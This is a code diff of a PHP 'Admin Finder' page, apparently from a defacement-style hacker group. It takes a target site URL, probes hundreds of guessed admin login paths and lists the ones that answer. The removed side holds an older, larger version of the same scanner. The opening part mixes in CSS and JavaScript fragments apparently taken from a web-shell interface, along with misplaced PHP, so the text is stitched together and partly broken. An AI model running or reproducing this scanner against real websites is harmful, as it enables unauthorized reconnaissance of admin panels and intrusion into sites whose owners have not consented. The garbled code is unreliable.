@@ -1,583 +1,223 @@
+<style type="text/css">
+<!--
+.headera { 
+color: lime;
+}
+.whole {
+	
+	height:auto;
+	width: auto;
+	margin-top: 10px;
+	margin-right: 10px;
+	margin-left: 10px;
+    background-image: linear-gradient(
+      rgba(0, 0, 0, 0.4), 
+      rgba(0, 0, 0, 0.4)
+    ), 
+
+}
+.header {
+table-layout: fixed;
+	height: auto;
+	width: auto;
+	border:  4px solid #5BEEFF;
+	color: yellow;
+	font-size: 19px;
+	font-family: Courier, Geneva, sans-serif;
+} 
+tr {
+  display: table-row;
+  vertical-align: inherit;
+  padding-right:10px;
+}table {
+  display: table;
+  border-collapse: separate;
+  border-spacing: 2px;
+  border-color: #5BEEFF;
+}
+.header a {color:#0F0; text-decoration:none;}
+span {
+	font-weight: bolder;
+	color: #FFF;
+}
+#meunlist {
+	font-family: Courier, Geneva, sans-serif;
+	color: #FFF;
+	background-color: black;
+	width: auto;
+	border-right-width: 7px;
+	border-left-width: 7px;
+	border-top-style: solid;
+	border-right-style: solid;
+	border-bottom-style: solid;
+	border-left-style: solid;
+	border-color: #5BEEFF;
+	height: auto;
+	font-size: 15px;
+	font-weight: bold;
+	border-top-width: 0px;
+}
+  .whole #meunlist ul {
+	padding-top: 5px;
+	padding-right: 5px;
+	padding-bottom: 7px;
+	padding-left: 2px;
+	text-align:center;
+	list-style-type: none;
+	margin: 0px;
+}
+  .whole #meunlist li {
+	margin: 0px;
+	padding: 0px;
+	display: inline;
+}
+  .whole #meunlist a {
+    font-family: arial, Courier;
+	font-size: 16px;
+	text-decoration:none;
+	font-weight: bold;
+	color: #fff;
+	clear: both;
+	width: 100px;
+	margin-right: -6px;
+	padding-top: 3px;
+	padding-right: 15px;
+	padding-bottom: 3px;
+	padding-left: 15px;
+	border-right-width: 1px;
+	border-right-style: solid;
+	border-right-color: #FFF;
+}
+  .whole #meunlist a:hover {
+	color: white;
+	background: #fff;
+}
+.menu a:hover {	background:#5BEEFF;}
+a:hover        { color:lime;background:black;} 
+    .ml1        { border:1px solid #2438CF;padding:5px;margin:0;overflow: auto; } 
+    .bigarea    { width:100%;height:250px; border:1px solid red; background:#171717;}
+    input, textarea, select    { margin:0;color:#FF0000;background-color:#000;border:1px solid #5BEEFF; font: 9pt Courier,"Couriern"; } 
+    form        { margin:0px; } 
+    #toolsTbl    { text-align:center; } 
+    .toolsInp    { width: 80%; } 
+   .main th    {text-align:left;background-color:#990000;color:white;} 
+ .main td, th{vertical-align:middle;} 
+    pre            {font-family:Courier,Monospace;} 
+    #cot_tl_fixed{position:fixed;bottom:0px;font-size:12px;left:0px;padding:4px 0;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);} 
+}';
+if(is_writable($GLOBALS['cwd']))
+ {
+ echo ".foottable {
+ width: 300px;
+ font-weight: bold;
+ }";}
+ else
+ {
+    echo ".foottable {
+ width: 300px;
+ font-weight: bold;
+ background-color:grey;
+ }
+ .dir {
+   background-color:grey;  
+ }
+ "; 
+ }    
+ echo '.main th{text-align:left;}
+ .main a{color: #FFF;}
+ .main tr:hover{background-color:lime;}
+ .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
+ .bigarea{ width:99%; height:300px; }   
+  </style>
+
+<script>
+ var c_ = '" . base64_encode(htmlspecialchars($GLOBALS['cwd'])) . "
+ var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
+ var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."
+ var p1_ = '" . ((strpos(@$_POST['p1'],"
+")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."
+ var p2_ = '" . ((strpos(@$_POST['p2'],"
+")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."
+ var p3_ = '" . ((strpos(@$_POST['p3'],"
+")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."
+ var d = document;
+	function set(a,c,p1,p2,p3,charset) {
+		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
+		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
+		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
+		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
+		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
+		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
+	}
+	function g(a,c,p1,p2,p3,charset) {
+		set(a,c,p1,p2,p3,charset)
+		d.mf.submit();
+	}</script>
+ 
+	
+</head>
+<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
+</table><table width=100% ><tr><td align=center width=60% >
+       <table border=3 width=100%><td width=25% align=right><font color=aqua size=4 face="comic sans ms"><td height="10" align="left" class="td1"></td></tr><tr>
+<center><img src=" https://3.bp.blogspot.com/-A8VAJ5ySsB0/XLynw1zeM0I/AAAAAAAAAew/VacQcG7afGIBmErDchvDypulTBlZ5L-JACLcBGAs/s1600/Sad%2BBoy.png " width="250" height="250"><center>        
+<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
+</table><table width=100% ><tr><td align=center width=60% >
+ 
+	<table border=1 width=100%><td width=15% align=right>
+</script>
+<div class="whole1"></div>
+<body bgcolor="#000000"  color="grey" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+ <div  style="position:absolute;top:30px;right:50px; font-size:25px;font-family:auto;z-index:-1;" rowspan="8"><font color=aqua></div>
+<div class="whole">
+<form method=post name=mf style="display:none;">
+<input type=hidden name=a>
+<input type=hidden name=c>
+<input type=hidden name=p1>
+<input type=hidden name=p2>
+<input type=hidden name=p3>
+<input type=hidden name=charset>
+</form>
+  <div class="header"><table  class="headmain" width="100%" border="0"  align="lift">
+  <tr>
+ </div>
+<!DOCTYPE HTML>
+<html>
+<head>
+<title>Admin Finder</title>
+<body >
+<center>
+<type='text/javascript'/></script>
+<style>
+</style>
+<p>Admin Login Finder<p>
+</head>
+</style>
+<br>
+<br><center><font color=''> catatan: Jika Mau Jalankan Tools ini, Belakang Domain Tambahkan " / "  </font></center>
+<br><center><font color=''> Note: if you want to use this tools please input" / "on the last key </font></center>
+<br>
+<td width=100% id=Gretz>
+<form action="" method="post">
+<center><p class="frontboxtext"><input name="hash_lol" class="textbox" type="text" size="30" value="http://www.target.co.il/"/>
+<input name="submit_lol" class="textbox" value="Submit Site" type="submit">
+<p>copyright_2019_Sad-Boy_Web</p>
+</form>
 <?php
 set_time_limit(0);
-error_reporting(0);
-$list['front'] ="admin
-adm
-admincp
-admcp
-cp
-modcp
-moderatorcp
-adminare
-admins
-cpanel
-controlpanel";
-$list['end'] = "admin1.php
-admin1.html
-admin2.php
-admin2.html
-yonetim.php
-yonetim.html
-yonetici.php
-yonetici.html
-ccms/
-ccms/login.php
-ccms/index.php
-maintenance/
-webmaster/
-adm/
-configuration/
-configure/
-websvn/
-admin/
-admin/account.php
-admin/account.html
-admin/index.php
-admin/index.html
-admin/login.php
-admin/login.html
-admin/home.php
-admin/controlpanel.html
-admin/controlpanel.php
-admin.php
-admin.html
-admin/cp.php
-admin/cp.html
-cp.php
-cp.html
-administrator/
-administrator/index.html
-administrator/index.php
-administrator/login.html
-administrator/login.php
-administrator/account.html
-administrator/account.php
-administrator.php
-administrator.html
-login.php
-login.html
-modelsearch/login.php
-moderator.php
-moderator.html
-moderator/login.php
-moderator/login.html
-moderator/admin.php
-moderator/admin.html
-moderator/
-account.php
-account.html
-controlpanel/
-controlpanel.php
-controlpanel.html
-admincontrol.php
-admincontrol.html
-adminpanel.php
-adminpanel.html
-admin1.asp
-admin2.asp
-yonetim.asp
-yonetici.asp
-admin/account.asp
-admin/index.asp
-admin/login.asp
-admin/home.asp
-admin/controlpanel.asp
-admin.asp
-admin/cp.asp
-cp.asp
-administrator/index.asp
-administrator/login.asp
-administrator/account.asp
-administrator.asp
-login.asp
-modelsearch/login.asp
-moderator.asp
-moderator/login.asp
-moderator/admin.asp
-account.asp
-controlpanel.asp
-admincontrol.asp
-adminpanel.asp
-fileadmin/
-fileadmin.php
-fileadmin.asp
-fileadmin.html
-administration/
-administration.php
-administration.html
-sysadmin.php
-sysadmin.html
-phpmyadmin/
-myadmin/
-sysadmin.asp
-sysadmin/
-ur-admin.asp
-ur-admin.php
-ur-admin.html
-ur-admin/
-Server.php
-Server.html
-Server.asp
-Server/
-wp-admin/
-administr8.php
-administr8.html
-administr8/
-administr8.asp
-webadmin/
-webadmin.php
-webadmin.asp
-webadmin.html
-administratie/
-admins/
-admins.php
-admins.asp
-admins.html
-administrivia/
-Database_Administration/
-WebAdmin/
-useradmin/
-sysadmins/
-admin1/
-system-administration/
-administrators/
-pgadmin/
-directadmin/
-staradmin/
-ServerAdministrator/
-SysAdmin/
-administer/
-LiveUser_Admin/
-sys-admin/
-typo3/
-panel/
-cpanel/
-cPanel/
-cpanel_file/
-platz_login/
-rcLogin/
-blogindex/
-formslogin/
-autologin/
-support_login/
-meta_login/
-manuallogin/
-simpleLogin/
-loginflat/
-utility_login/
-showlogin/
-memlogin/
-members/
-login-redirect/
-sub-login/
-wp-login/
-login1/
-dir-login/
-login_db/
-xlogin/
-smblogin/
-customer_login/
-UserLogin/
-login-us/
-acct_login/
-admin_area/
-bigadmin/
-project-admins/
-phppgadmin/
-pureadmin/
-sql-admin/
-radmind/
-openvpnadmin/
-wizmysqladmin/
-vadmind/
-ezsqliteadmin/
-hpwebjetadmin/
-newsadmin/
-adminpro/
-Lotus_Domino_Admin/
-bbadmin/
-vmailadmin/
-Indy_admin/
-ccp14admin/
-irc-macadmin/
-banneradmin/
-sshadmin/
-phpldapadmin/
-macadmin/
-administratoraccounts/
-admin4_account/
-admin4_colon/
-radmind-1/
-Super-Admin/
-AdminTools/
-cmsadmin/
-SysAdmin2/
-globes_admin/
-cadmins/
-phpSQLiteAdmin/
-navSiteAdmin/
-server_admin_small/
-logo_sysadmin/
-server/
-database_administration/
-power_user/
-system_administration/
-ss_vms_admin_sm/
-adminarea/
-bb-admin/
-adminLogin/
-panel-administracion/
-instadmin/
-memberadmin/
-administratorlogin/
-admin/admin.php
-admin_area/admin.php
-admin_area/login.php
-siteadmin/login.php
-siteadmin/index.php
-siteadmin/login.html
-admin/admin.html
-admin_area/index.php
-bb-admin/index.php
-bb-admin/login.php
-bb-admin/admin.php
-admin_area/login.html
-admin_area/index.html
-admincp/index.asp
-admincp/login.asp
-admincp/index.html
-webadmin/index.html
-webadmin/admin.html
-webadmin/login.html
-admin/admin_login.html
-admin_login.html
-panel-administracion/login.html
-nsw/admin/login.php
-webadmin/login.php
-admin/admin_login.php
-admin_login.php
-admin_area/admin.html
-pages/admin/admin-login.php
-admin/admin-login.php
-admin-login.php
-bb-admin/index.html
-bb-admin/login.html
-bb-admin/admin.html
-admin/home.html
-pages/admin/admin-login.html
-admin/admin-login.html
-admin-login.html
-admin/adminLogin.html
-adminLogin.html
-home.html
-rcjakar/admin/login.php
-adminarea/index.html
-adminarea/admin.html
-webadmin/index.php
-webadmin/admin.php
-user.html
-modelsearch/login.html
-adminarea/login.html
-panel-administracion/index.html
-panel-administracion/admin.html
-modelsearch/index.html
-modelsearch/admin.html
-admincontrol/login.html
-adm/index.html
-adm.html
-user.php
-panel-administracion/login.php
-wp-login.php
-adminLogin.php
-admin/adminLogin.php
-home.php
-adminarea/index.php
-adminarea/admin.php
-adminarea/login.php
-panel-administracion/index.php
-panel-administracion/admin.php
-modelsearch/index.php
-modelsearch/admin.php
-admincontrol/login.php
-adm/admloginuser.php
-admloginuser.php
-admin2/login.php
-admin2/index.php
-adm/index.php
-adm.php
-affiliate.php
-adm_auth.php
-memberadmin.php
-administratorlogin.php
-admin/admin.asp
-admin_area/admin.asp
-admin_area/login.asp
-admin_area/index.asp
-bb-admin/index.asp
-bb-admin/login.asp
-bb-admin/admin.asp
-pages/admin/admin-login.asp
-admin/admin-login.asp
-admin-login.asp
-user.asp
-webadmin/index.asp
-webadmin/admin.asp
-webadmin/login.asp
-admin/admin_login.asp
-admin_login.asp
-panel-administracion/login.asp
-adminLogin.asp
-admin/adminLogin.asp
-home.asp
-adminarea/index.asp
-adminarea/admin.asp
-adminarea/login.asp
-panel-administracion/index.asp
-panel-administracion/admin.asp
-modelsearch/index.asp
-modelsearch/admin.asp
-admincontrol/login.asp
-adm/admloginuser.asp
-admloginuser.asp
-admin2/login.asp
-admin2/index.asp
-adm/index.asp
-adm.asp
-affiliate.asp
-adm_auth.asp
-memberadmin.asp
-administratorlogin.asp
-siteadmin/login.asp
-siteadmin/index.asp
-ADMIN/
-paneldecontrol/
-login/
-cms/
-admon/
-ADMON/
-administrador/
-ADMIN/login.php
-panelc/
-ADMIN/login.html";
-function template() {
-echo '
-
-<script type="text/javascript">
-<!--
-function insertcode($text, $place, $replace)
-{
-    var $this = $text;
-    var logbox = document.getElementById($place);
-    if($replace == 0)
-        document.getElementById($place).innerHTML = logbox.innerHTML+$this;
-    else
-        document.getElementById($place).innerHTML = $this;
-//document.getElementById("helpbox").innerHTML = $this;
-}
--->
-</script>
-<br>
-<br>
-<h1 class="technique-two">
-   <meta charset="utf-8">
-  <link rel="icon" type="image/png" href="http://pereyaslav-rda.gov.ua//images/20190623_120810.jpg">
-  <title>[ Admin Finder ]</title>
-  <meta content="width=device-width, initial-scale=1.0" name="viewport">
-  <meta content="" name="keywords">
-  <meta name="description" content="Fungsi:Mencari Halaman Login Admin Website">
-
-
-<FONT SIZE=5>Admin Finder</FONT><center>
-
-<FONT SIZE=3>Fungsi:Mencari Halaman Login Admin</FONT><center>
-<FONT SIZE=3>Cara Penggunaan:Isi Url Dengan Website Target,Dan Isi 404 Stringnya,Contoh:1111111</FONT><center>
-
-</h1>
-
-<div class="wrapper">
-<div class="red">
-<div class="tube">
-<form action="" method="post" name="xploit_form">
-
-<tr>
-<tr>
-	<b><td>URL</td>
-	<td><input class="inputz" type="text" name="xploit_url" value="'.$_POST['xploit_url'].'" style="width: 350px;" />
-	</td>
-</tr><tr>
-	<td>404 string</td>
-	<td><input class="inputz" type="text" name="xploit_404string" value="'.$_POST['xploit_404string'].'" style="width: 350px;" />
-	</td></b>
-</tr><br><td>
-
-<style>
-{
-    border: 5px solid #d1d1d1;
-    width:500px;
-    padding:10px;
-}
-
-	
-{
-    border: 5px solid #d1d1d1;
-    width:500px;
-    padding:10px;
-}
-
-
-
- textarea{
-     padding: 10px;
-     border:3px solid #e6e6e6;
-     border-radius: 5px;
-     margin-bottom: 15px; 
-}
-
-input, textarea{
-     padding: 10px;
-     border:3px solid #e6e6e6;
-     border-radius: 5px;
-     margin-bottom: 15px; 
-}
-
-Tilik lagi hasilnya
-
-3
-
-input:focus, textarea:focus{
-    border:3px solid #5E4F4F;
-}
-
-textarea{
-    width:300px;
-}
-	
-input:focus, textarea:focus{
-    border:3px solid #5E4F4F;
-}
  
-textarea{
-    width:300px;
-}
-
-input[type="submit"]{
-     cursor: pointer;
-     background: -webkit-linear-gradient(top, #efefef, #ddd);
-     background: -moz-linear-gradient(top, #efefef, #ddd);
-     background: -ms-linear-gradient(top, #efefef, #ddd);
-     background: -o-linear-gradient(top, #efefef, #ddd);
-     background: linear-gradient(top, #efefef, #ddd);
-     color: #333;
-     text-shadow: 0px 1px 1px rgba(255,255,255,1);
-     border: 1px solid #ccc;
-}
-
-input[type="submit"]:hover {
-     background: -webkit-linear-gradient(top, #eee, #ccc);
-     background: -moz-linear-gradient(top, #eee, #ccc);
-     background: -ms-linear-gradient(top, #eee, #ccc);
-     background: -o-linear-gradient(top, #eee, #ccc);
-     background: linear-gradient(top, #eee, #ccc);
-     border: 1px solid #bbb;
-}
-
-	
-input[type="submit"]{
-     cursor: pointer;
-     background: -webkit-linear-gradient(top, #efefef, #ddd);
-     background: -moz-linear-gradient(top, #efefef, #ddd);
-     background: -ms-linear-gradient(top, #efefef, #ddd);
-     background: -o-linear-gradient(top, #efefef, #ddd);
-     background: linear-gradient(top, #efefef, #ddd);
-     color: #333;
-     text-shadow: 0px 1px 1px rgba(255,255,255,1);
-     border: 1px solid #ccc;
-}
+if (isset($_POST["submit_lol"])) {
+$url = $_POST['hash_lol'];
+echo "<br />Crot ".$url."<br /><br />";
  
-input[type="submit"]:hover {
-     background: -webkit-linear-gradient(top, #eee, #ccc);
-     background: -moz-linear-gradient(top, #eee, #ccc);
-     background: -ms-linear-gradient(top, #eee, #ccc);
-     background: -o-linear-gradient(top, #eee, #ccc);
-     background: linear-gradient(top, #eee, #ccc);
-     border: 1px solid #bbb;
+$adminlocales = array("-adminweb/","!adminweb/","@adminweb/","adminweb121/","adminweb90/","adminweb145/","khususadmin/","rahasiaadm/","adminweb123123/","adminweb2222/","adminlanel/","adminlanel.php/","monitor123.php/","masuk.php/","css.php/", "admin1235.php/", "master.php/","1admin/","123admin/","addmin/","home.php","css/","rediect.php/","masuk.php/","index.php/","webpaneladmin123/","registeradm/","register/","member123/","123adminweb/","123paneladminweb/","panelauth1231/","loginadminweb21/","loginadminweb123/","loginadminweb/","webadmin123/","redakturadmin/","paneladminweb/","admloginadm/","4dm1n/","admin12345/","adminweb12/","adminweb111/","adminweb123/","adminweb1/","gangmasuk/","gangadmin/","admredaktur/","adminwebredaktur/","adminredaktur/","adm/", "_adm_/", "_admin_/", "_loginadm_/", "_login_admin_/", "minmin", "loginadmin3/",  "masuk/admin", "webmail", "_loginadmin_/", "_login_admin.php_/", "_admin_/", "_administrator_/", "operator/", "sika/", "adminweb/", "develop/", "ketua/", "redaktur/", "author/", "admin/", "administrator/", "adminweb/", "user/", "users/", "dinkesadmin/", "retel/", "author/", "panel/", "paneladmin/", "panellogin/", "redaksi/", "cp-admin/", "login@web/", "admin1/", "admin2/", "admin3/", "admin4/", "admin5/", "admin6/", "admin7", "admin8", "admin9", "admin10", "master/", "master/index.php", "master/login.php", "operator/index.php", "sika/index.php", "develop/index.php", "ketua/index.php","redaktur/index.php", "admin/index.php", "administrator/index.php", "adminweb/index.php", "user/index.php", "users/index.php", "dinkesadmin/index.php", "retel/index.php", "author/index.php", "panel/index.php", "paneladmin/index.php", "panellogin/index.php", "redaksi/index.php", "cp-admin/index.php", "operator/login.php", "sika/login.php", "develop/login.php", "ketua/login.php", "redaktur/login.php", "admin/login.php", "administrator/login.php", "adminweb/login.php", "user/login.php", "users/login.php", "dinkesadmin/login.php", "retel/login.php", "author/login.php", "panel/login.php", "paneladmin/login.php", "panellogin/login.php", "redaksi/login.php", "cp-admin/login.php", "terasadmin/", "terasadmin/index.php", "terasadmin/login.php", "rahasia/", "rahasia/index.php", "rahasia/admin.php", "rahasia/login.php", "dinkesadmin/", "dinkesadmin/login.php", "adminpmb/", "adminpmb/index.php", "adminpmb/login.php", "system/", "system/index.php", "system/login.php", "webadmin/", "webadmin/index.php", "webadmin/login.php", "wpanel/", "wpanel/index.php", "wpanel/login.php", "adminpanel/index.php", "adminpanel/", "adminpanel/login.php", "adminkec/", "adminkec/index.php", "adminkec/login.php", "admindesa/", "admindesa/index.php", "admindesa/login.php", "adminkota/", "adminkota/index.php", "adminkota/login.php", "admin123/", "admin123/index.php", "dologin/", "home.asp/","supervise/amdin", "relogin/adm", "checkuser", "relogin.php", "relogin.asp", "wp-admin", "registration", "suvervise", "superman.php", "member.php","home/admin","po-admin/","do_login.php", "bo-login", "bo_login.php/", "index.php/admin", "admiiin.php", "masuk/adm","website_login/", "dashboard/admin", "dashboard.php", "dashboard_adm", "admin123/login.php", "logout1/", "logout/","pengelola/login", "manageradm/", "logout.asp", "manager/adm", "pengelola/web","auth/panel", "logout/index.php", "logout/login.php", "controladm/", "logout/admin.php", "adminweb_setting", "adm/index.asp", "adm.asp", "affiliate.asp", "adm_auth.asp", "memberadmin.asp", "siteadmin/login.asp", "siteadmin/login", "paneldecontrol", "cms/admin", "administracion.php", "/ADMON/", "administrador/", "panelc/", "admincp", "admcp", "cp", "modcp", "moderatorcp", "adminare", "cpanel", "controlpanel");
+ 
+foreach ($adminlocales as $admin){
+$headers = get_headers("$url$admin");
+if (eregi('200', $headers[0])) {
+    echo "<a href='$url/$admin'>$url$admin</a> <font color='lime'>Found !</font><br />";
 }
-</style>
-<span style="float: center;"><input class="inputzbut" type="submit" name="xploit_submit" value=" Start Scan" align="center" />
-</span></td></tr>
-</form></td></tr>
-<br /></table>
-<FONT SIZE=2>Copyright_2019_Sad-Boy_Web</FONT><center>
-</div> <!-- /tube -->
-</div> <!-- /red -->
-<br />
-<div class="green">
-<div class="tube" id="rightcol">
-Verificat: <span id="verified">0</span> / <span id="total">0</span><br />
-<b>Found ones:<br /></b>
-</div> <!-- /tube -->
-</div></center><!-- /green -->
-<br clear="all" /><br />
-<div class="blue">
-<div class="tube" id="logbox">
-<br />
-<br />
-Admin page Finder :<br /><br />
-</div> <!-- /tube -->
-</div> <!-- /blue -->
-</div> <!-- /wrapper -->
-<br clear="all"><br>';
+else {
+    echo "$url$admin <font color='red'>Not Found</font><br />";
 }
-function show($msg, $br=1, $stop=0, $place='logbox', $replace=0) {
-    if($br == 1) $msg .= "<br />";
-    echo "<script type=\"text/javascript\">insertcode('".$msg."', '".$place."', '".$replace."');</script>";
-    if($stop == 1) exit;
-    @flush();@ob_flush();
 }
-function check($x, $front=0) {
-    global $_POST,$site,$false;
-    if($front == 0) $t = $site.$x;
-    else $t = 'http://'.$x.'.'.$site.'/';
-    $headers = get_headers($t);
-    if (!eregi('200', $headers[0])) return 0;
-    $data = @file_get_contents($t);
-    if($_POST['xploit_404string'] == "") if($data == $false) return 0;
-    if($_POST['xploit_404string'] != "") if(strpos($data, $_POST['xploit_404string'])) return 0;
-    return 1;
-}
-   
-// --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-template();
-if(!isset($_POST['xploit_url'])) die;
-if($_POST['xploit_url'] == '') die;
-$site = $_POST['xploit_url'];
-if ($site[strlen($site)-1] != "/") $site .= "/";
-if($_POST['xploit_404string'] == "") $false = @file_get_contents($site."d65897f5380a21a42db94b3927b823d56ee1099a-this_can-t_exist.html");
-$list['end'] = str_replace("\r", "", $list['end']);
-$list['front'] = str_replace("\r", "", $list['front']);
-$pathes = explode("\n", $list['end']);
-$frontpathes = explode("\n", $list['front']);
-show(count($pathes)+count($frontpathes), 1, 0, 'total', 1);
-$verificate = 0;
-foreach($pathes as $path) {
-    show('Checking '.$site.$path.' : ', 0, 0, 'logbox', 0);
-    $verificate++; show($verificate, 0, 0, 'verified', 1);
-    if(check($path) == 0) show('not found', 1, 0, 'logbox', 0);
-    else{
-        show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
-        show('<a href="'.$site.$path.'">'.$site.$path.'</a>', 1, 0, 'rightcol', 0);
-    }
-}
-preg_match("/\/\/(.*?)\//i", $site, $xx); $site = $xx[1];
-if(substr($site, 0, 3) == "www") $site = substr($site, 4);
-foreach($frontpathes as $frontpath) {
-    show('Checking http://'.$frontpath.'.'.$site.'/ : ', 0, 0, 'logbox', 0);
-    $verificate++; show($verificate, 0, 0, 'verified', 1);
-    if(check($frontpath, 1) == 0) show('not found', 1, 0, 'logbox', 0);
-    else{
-        show('<span style="color: #00FF00;"><strong>found</strong></span>', 1, 0, 'logbox', 0);
-        show('<a href="http://'.$frontpath.'.'.$site.'/">'.$frontpath.'.'.$site.'</a>', 1, 0, 'rightcol', 0);
-    }
-   
-}
-
+}  
